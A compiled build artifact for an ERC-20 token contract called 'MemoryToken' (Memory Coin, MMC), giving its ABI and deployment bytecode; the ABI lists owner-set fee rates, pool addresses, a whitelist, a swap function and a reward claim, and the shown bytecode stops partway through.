{
  "contractName": "MemoryToken",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "token",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "pair",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "rate",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "Swap",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "subtractedValue",
          "type": "uint256"
        }
      ],
      "name": "decreaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "addedValue",
          "type": "uint256"
        }
      ],
      "name": "increaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint8",
          "name": "rate",
          "type": "uint8"
        }
      ],
      "name": "setBuyRate",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint8",
          "name": "rate",
          "type": "uint8"
        }
      ],
      "name": "setRewardRate",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "pair",
          "type": "address"
        }
      ],
      "name": "setPairAddress",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "name",
          "type": "string"
        },
        {
          "internalType": "address",
          "name": "pool",
          "type": "address"
        }
      ],
      "name": "setPoolAddress",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint8",
          "name": "index",
          "type": "uint8"
        },
        {
          "internalType": "uint256",
          "name": "start",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "end",
          "type": "uint256"
        },
        {
          "internalType": "uint8",
          "name": "fee",
          "type": "uint8"
        },
        {
          "internalType": "uint8",
          "name": "pool",
          "type": "uint8"
        }
      ],
      "name": "setSallRate",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "target",
          "type": "address"
        },
        {
          "internalType": "bool",
          "name": "enable",
          "type": "bool"
        }
      ],
      "name": "setWhiteList",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "swap",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "getReward",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "claim",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040523480156200001157600080fd5b50604051620044f6380380620044f6833981810160405281019062000037919062000772565b6040518060400160405280600b81526020017f4d656d6f727920436f696e0000000000000000000000000000000000000000008152506040518060400160405280600381526020017f4d4d4300000000000000000000000000000000000000000000000000000000008152508160039080519060200190620000bb929190620006ab565b508060049080519060200190620000d4929190620006ab565b50505060006353724e0090506000620000f26200053860201b60201c565b60ff16600a620001039190620009b8565b90506200012433828462000118919062000af5565b6200054160201b60201c565b60405180608001604052806000815260200182600562000145919062000af5565b8152602001600a60ff168152602001603260ff16815250600d6000600160ff168152602001908152602001600020600082015181600001556020820151816001015560408201518160020160006101000a81548160ff021916908360ff16021790555060608201518160020160016101000a81548160ff021916908360ff1602179055509050506040518060800160405280826005620001e6919062000af5565b815260200182600a620001fa919062000af5565b8152602001600f60ff168152602001603260ff16815250600d6000600260ff168152602001908152602001600020600082015181600001556020820151816001015560408201518160020160006101000a81548160ff021916908360ff16021790555060608201518160020160016101000a81548160ff021916908360ff160217905550905050604051806080016040528082600a6200029b919062000af5565b8152602001826064620002af919062000af5565b8152602001601e60ff168152602001603260ff16815250600d6000600360ff168152602001908152602001600020600082015181600001556020820151816001015560408201518160020160006101000a81548160ff021916908360ff16021790555060608201518160020160016101000a81548160ff021916908360ff16021790555090505033600b604051620003479062000877565b908152602001604051809103902060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600b604051620003a49062000860565b908152602001604051809103902060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600b60405162000401906200088e565b908152602001604051809103902060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506001600c60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555083600960006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555082600a60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550426006819055505050505062000cf3565b60006012905090565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415620005b4576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401620005ab90620008a5565b60405180910390fd5b620005c860008383620006a660201b60201c565b8060026000828254620005dc919062000900565b92505081905550806000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825462000633919062000900565b925050819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040516200069a9190620008c7565b60405180910390a35050565b505050565b828054620006b99062000b94565b90600052602060002090601f016020900481019282620006dd576000855562000729565b82601f10620006f857805160ff191683800117855562000729565b8280016001018555821562000729579182015b82811115620007285782518255916020019190600101906200070b565b5b5090506200073891906200073c565b5090565b5b80821115620007575760008160009055506001016200073d565b5090565b6000815190506200076c8162000cd9565b92915050565b600080604083850312156200078657600080fd5b600062000796858286016200075b565b9250506020620007a9858286016200075b565b9150509250929050565b6000620007c2600683620008f5565b9150620007cf8262000c35565b600682019050919050565b6000620007e9600483620008f5565b9150620007f68262000c5e565b600482019050919050565b600062000810600783620008f5565b91506200081d8262000c87565b600782019050919050565b600062000837601f83620008e4565b9150620008448262000cb0565b602082019050919050565b6200085a8162000b8a565b82525050565b60006200086d82620007b3565b9150819050919050565b60006200088482620007da565b9150819050919050565b60006200089b8262000801565b9150819050919050565b60006020820190508181036000830152620008c08162000828565b9050919050565b6000602082019050620008de60008301846200084f565b92915050565b600082825260208201905092915050565b600081905092915050565b60006200090d8262000b8a565b91506200091a8362000b8a565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0382111562000952576200095162000bca565b5b828201905092915050565b6000808291508390505b6001851115620009af5780860481111562000987576200098662000bca565b5b6001851615620009975780820291505b8081029050620009a78562000c28565b945062000967565b94509492505050565b6000620009c58262000b8a565b9150620009d28362000b8a565b925062000a017fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff848462000a09565b905092915050565b60008262000a1b576001905062000aee565b8162000a2b576000905062000aee565b816001811462000a44576002811462000a4f5762000a85565b600191505062000aee565b60ff84111562000a645762000a6362000bca565b5b8360020a91508482111562000a7e5762000a7d62000bca565b5b5062000aee565b5060208310610133831016604e8410600b841016171562000abf5782820a90508381111562000ab95762000ab862000bca565b5b62000aee565b62000ace84848460016200095d565b9250905081840481111562000ae85762000ae762000bca565b5b81810290505b9392505050565b600062000b028262000b8a565b915062000b0f8362000b8a565b9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff048311821515161562000b4b5762000b4a62000bca565b5b828202905092915050565b600062000b638262000b6a565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b6000600282049050600182168062000bad57607f821691505b6020821081141562000bc45762000bc362000bf9565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b60008160011c9050919050565b7f5245574152440000000000000000000000000000000000000000000000000000600082015250565b7f46554e4400000000000000000000000000000000000000000000000000000000600082015250565b7f4c4f545445525900000000000000000000000000000000000000000000000000600082015250565b7f45524332303a206d696e7420746f20746865207a65726f206164647265737300600082015250565b62000ce48162000b56565b811462000cf057600080fd5b50565b6137f38062000d036000396000f3fe608060405234801561001057600080fd5b506004361061012c5760003560e01c80638d14e127116100ad578063baa95fa811610071578063baa95fa814610359578063c00007b014610375578063dd62ed3e146103a5578063f33eaadf146103d5578063fa40df0c146103f15761012c565b80638d14e127146102a357806395d89b41146102bf578063a22d4832146102dd578063a457c2d7146102f9578063a9059cbb146103295761012c565b806339509351116100f457806339509351146101eb5780634e71d92d1461021b578063673725001461023957806370a08231146102555780638119c065146102855761012c565b806306fdde0314610131578063095ea7b31461014f57806318160ddd1461017f57806323b872dd1461019d578063313ce567146101cd575b600080fd5b61013961040d565b6040516101469190612ce7565b60405180910390f35b61016960048036038101906101649190612812565b61049f565b6040516101769190612ccc565b60405180910390f35b6101876104bd565b6040516101949190612e69565b60405180910390f35b6101b760048036038101906101b29190612787565b6104c7565b6040516101c49190612ccc565b60405180910390f35b6101d5610b96565b6040516101e29190612ead565b60405180910390f35b61020560048036038101906102009190612812565b610b9f565b6040516102129190612ccc565b60405180910390f35b610223610c4b565b6040516102309190612ccc565b60405180910390f35b610253600480360381019061024e91906128f4565b610ca6565b005b61026f600480360381019061026a9190612722565b610d54565b60405161027c9190612e69565b60405180910390f35b61028d610d9c565b60405161029a9190612ccc565b60405180910390f35b6102bd60048036038101906102b891906127d6565b6112bd565b005b6102c76113a8565b6040516102d49190612ce7565b60405180910390f35b6102f760048036038101906102f29190612722565b61143a565b005b610313600480360381019061030e9190612812565b61150e565b6040516103209190612ccc565b60405180910390f35b610343600480360381019061033e9190612812565b611602565b6040516103509190612ccc565b60405180910390f35b610373600480360381019061036e9190612877565b611cca565b005b61038f600480360381019061038a9190612722565b611dbb565b60405161039c9190612e69565b60405180910390f35b6103bf60048036038101906103ba919061274b565b611dcd565b6040516103cc9190612e69565b60405180910390f35b6103ef60048036038101906103ea919061291d565b611e54565b005b61040b600480360381019061040691906128f4565b611f84565b005b60606003805461041c90613262565b80601f016020809104026020016040519081016040528092919081815260200182805461044890613262565b80156104955780601f1061046a57610100808354040283529160200191610495565b820191906000526020600020905b81548152906001019060200180831161047857829003601f168201915b5050505050905090565b60006104b36104ac612032565b848461203a565b6001905092915050565b6000600254905090565b600080821161050b576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161050290612de9565b60405180910390fd5b600c60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff161561056f57610568848484612205565b9050610b8f565b600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16141561098157600061061983600e60008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461230690919063ffffffff16565b90506000806000610628610b96565b60ff16600a610637919061301f565b905060006106676106466104bd565b610659848861231c90919063ffffffff16565b61233290919063ffffffff16565b90506000600d6000600160ff16815260200190815260200160002060405180608001604052908160008201548152602001600182015481526020016002820160009054906101000a900460ff1660ff1660ff1681526020016002820160019054906101000a900460ff1660ff1660ff168152505090506000600d6000600260ff16815260200190815260200160002060405180608001604052908160008201548152602001600182015481526020016002820160009054906101000a900460ff1660ff1660ff1681526020016002820160019054906101000a900460ff1660ff1660ff168152505090506000600d6000600360ff16815260200190815260200160002060405180608001604052908160008201548152602001600182015481526020016002820160009054906101000a900460ff1660ff1660ff1681526020016002820160019054906101000a900460ff1660ff1660ff16815250509050826000015184101580156107dc5750826020015184105b156107f657826040015160ff169650826060015160ff1695505b8160000151841015801561080d5750816020015184105b1561082757816040015160ff169650816060015160ff1695505b8060000151841015801561083e5750806020015184105b1561085857806040015160ff169650806060015160ff1695505b600061088060646108728a8e61231c90919063ffffffff16565b61233290919063ffffffff16565b90506000610897828d61234890919063ffffffff16565b905060006108c160646108b38b8561231c90919063ffffffff16565b61233290919063ffffffff16565b90506108ce8f8f85612205565b506109168f600b6040516108e190612c50565b908152602001604051809103902060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1683612205565b506109708f600b60405161092990612c65565b908152602001604051809103902060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1661096b848661234890919063ffffffff16565b612205565b505050505050505050505050610a25565b60006109bb60646109ad600560009054906101000a900460ff1660ff168661231c90919063ffffffff16565b61233290919063ffffffff16565b9050610a0485600b6040516109cf90612c3b565b908152602001604051809103902060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1683612205565b50610a228585610a1d848761234890919063ffffffff16565b612205565b50505b610a3b600160075461230690919063ffffffff16565b6007819055506000806064600754610a53919061330e565b14159050600080610a9f600b604051610a6b90612c3b565b908152602001604051809103902060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16610d54565b111590508180610aac5750805b15610abc57600192505050610b8f565b6000610b03600b604051610acf90612c65565b908152602001604051809103902060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16610d54565b90506000610b3f6064610b31600560019054906101000a900460ff1660ff168561231c90919063ffffffff16565b61233290919063ffffffff16565b9050610b88600b604051610b5290612c3b565b908152602001604051809103902060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff163383612205565b9450505050505b9392505050565b60006012905090565b6000610c41610bac612032565b848460016000610bba612032565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610c3c9190612f45565b61203a565b6001905092915050565b600080610c573361235e565b9050610ca0600b604051610c6a90612c3b565b908152602001604051809103902060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff163383612205565b91505090565b600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610d36576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d2d90612e29565b60405180910390fd5b80600560006101000a81548160ff021916908360ff16021790555050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600080600f60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541415610eda576000600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231336040518263ffffffff1660e01b8152600401610e429190612c7a565b60206040518083038186803b158015610e5a57600080fd5b505afa158015610e6e573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610e9291906128cb565b905080600f60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505b600080600f60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905060005b6006811015610fa857601060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082815260200190815260200160002060009054906101000a900460ff16610f9557809250610fa8565b8080610fa0906132c5565b915050610f22565b506000610fd5610fc462278d008561231c90919063ffffffff16565b60065461230690919063ffffffff16565b9050804210611019576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161101090612dc9565b60405180910390fd5b601060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600084815260200190815260200160002060009054906101000a900460ff16156110b7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016110ae90612d69565b60405180910390fd5b6000600584146110c9576105dc6110cd565b6107d05b61ffff16905060006110fc6127106110ee848761231c90919063ffffffff16565b61233290919063ffffffff16565b90506000600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd3330856040518463ffffffff1660e01b815260040161115f93929190612c95565b602060405180830381600087803b15801561117957600080fd5b505af115801561118d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906111b1919061284e565b905080601060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600088815260200190815260200160002060006101000a81548160ff0219169083151502179055507f015fc8ee969fd902d9ebd12a31c54446400a2b512a405366fe14defd6081d220838660405161124c929190612e84565b60405180910390a1601060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600087815260200190815260200160002060009054906101000a900460ff16965050505050505090565b600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461134d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161134490612e29565b60405180910390fd5b80600c60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055505050565b6060600480546113b790613262565b80601f01602080910402602001604051908101604052809291908181526020018280546113e390613262565b80156114305780601f1061140557610100808354040283529160200191611430565b820191906000526020600020905b81548152906001019060200180831161141357829003601f168201915b5050505050905090565b600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146114ca576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016114c190612e29565b60405180910390fd5b80600a60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000806001600061151d612032565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050828110156115da576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016115d190612e49565b60405180910390fd5b6115f76115e5612032565b8585846115f29190613197565b61203a565b600191505092915050565b6000808211611646576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161163d90612de9565b60405180910390fd5b600c60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16156116a9576116a2838361239a565b9050611cc4565b600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415611ab857600061175383600e60008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461230690919063ffffffff16565b90506000806000611762610b96565b60ff16600a611771919061301f565b905060006117a16117806104bd565b611793848861231c90919063ffffffff16565b61233290919063ffffffff16565b90506000600d6000600160ff16815260200190815260200160002060405180608001604052908160008201548152602001600182015481526020016002820160009054906101000a900460ff1660ff1660ff1681526020016002820160019054906101000a900460ff1660ff1660ff168152505090506000600d6000600260ff16815260200190815260200160002060405180608001604052908160008201548152602001600182015481526020016002820160009054906101000a900460ff1660ff1660ff1681526020016002820160019054906101000a900460ff1660ff1660ff168152505090506000600d6000600360ff16815260200190815260200160002060405180608001604052908160008201548152602001600182015481526020016002820160009054906101000a900460ff1660ff1660ff1681526020016002820160019054906101000a900460ff1660ff1660ff16815250509050826000015184101580156119165750826020015184105b1561193057826040015160ff169650826060015160ff1695505b816000015184101580156119475750816020015184105b1561196157816040015160ff169650816060015160ff1695505b806000015184101580156119785750806020015184105b1561199257806040015160ff169650806060015160ff1695505b60006119ba60646119ac8a8e61231c90919063ffffffff16565b61233290919063ffffffff16565b905060006119d1828d61234890919063ffffffff16565b905060006119fb60646119ed8b8561231c90919063ffffffff16565b61233290919063ffffffff16565b9050611a078e8461239a565b50611a4e600b604051611a1990612c50565b908152602001604051809103902060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168261239a565b50611aa7600b604051611a6090612c65565b908152602001604051809103902060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16611aa2838561234890919063ffffffff16565b61239a565b505050505050505050505050611b5a565b6000611af26064611ae4600560009054906101000a900460ff1660ff168661231c90919063ffffffff16565b61233290919063ffffffff16565b9050611b3a600b604051611b0590612c3b565b908152602001604051809103902060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168261239a565b50611b5784611b52838661234890919063ffffffff16565b61239a565b50505b611b70600160075461230690919063ffffffff16565b6007819055506000806064600754611b88919061330e565b14159050600080611bd4600b604051611ba090612c3b565b908152602001604051809103902060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16610d54565b111590508180611be15750805b15611bf157600192505050611cc4565b6000611c38600b604051611c0490612c65565b908152602001604051809103902060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16610d54565b90506000611c746064611c66600560019054906101000a900460ff1660ff168561231c90919063ffffffff16565b61233290919063ffffffff16565b9050611cbd600b604051611c8790612c3b565b908152602001604051809103902060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff163383612205565b9450505050505b92915050565b600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614611d5a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611d5190612e29565b60405180910390fd5b80600b83604051611d6b9190612c24565b908152602001604051809103902060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050565b6000611dc68261235e565b9050919050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614611ee4576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611edb90612e29565b60405180910390fd5b60405180608001604052808581526020018481526020018360ff1681526020018260ff16815250600d60008760ff1660ff168152602001908152602001600020600082015181600001556020820151816001015560408201518160020160006101000a81548160ff021916908360ff16021790555060608201518160020160016101000a81548160ff021916908360ff1602179055509050505050505050565b600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614612014576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161200b90612e29565b60405180910390fd5b80600560016101000a81548160ff021916908360ff16021790555050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614156120aa576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016120a190612e09565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141561211a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161211190612d29565b60405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040516121f89190612e69565b60405180910390a3505050565b60006122128484846123b8565b6000600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061225d612032565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050828110156122dd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016122d490612d89565b60405180910390fd5b6122fa856122e9612032565b85846122f59190613197565b61203a565b60019150509392505050565b600081836123149190612f45565b905092915050565b6000818361232a919061313d565b905092915050565b600081836123409190612f9b565b905092915050565b600081836123569190613197565b905092915050565b600061236982610d54565b905061239361271061238560648461231c90919063ffffffff16565b61233290919063ffffffff16565b9050919050565b60006123ae6123a7612032565b84846123b8565b6001905092915050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415612428576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161241f90612da9565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415612498576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161248f90612d09565b60405180910390fd5b6124a3838383612637565b60008060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905081811015612529576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161252090612d49565b60405180910390fd5b81816125359190613197565b6000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546125c59190612f45565b925050819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040516126299190612e69565b60405180910390a350505050565b505050565b600061264f61264a84612eed565b612ec8565b90508281526020810184848401111561266757600080fd5b612672848285613220565b509392505050565b60008135905061268981613761565b92915050565b60008135905061269e81613778565b92915050565b6000815190506126b381613778565b92915050565b600082601f8301126126ca57600080fd5b81356126da84826020860161263c565b91505092915050565b6000813590506126f28161378f565b92915050565b6000815190506127078161378f565b92915050565b60008135905061271c816137a6565b92915050565b60006020828403121561273457600080fd5b60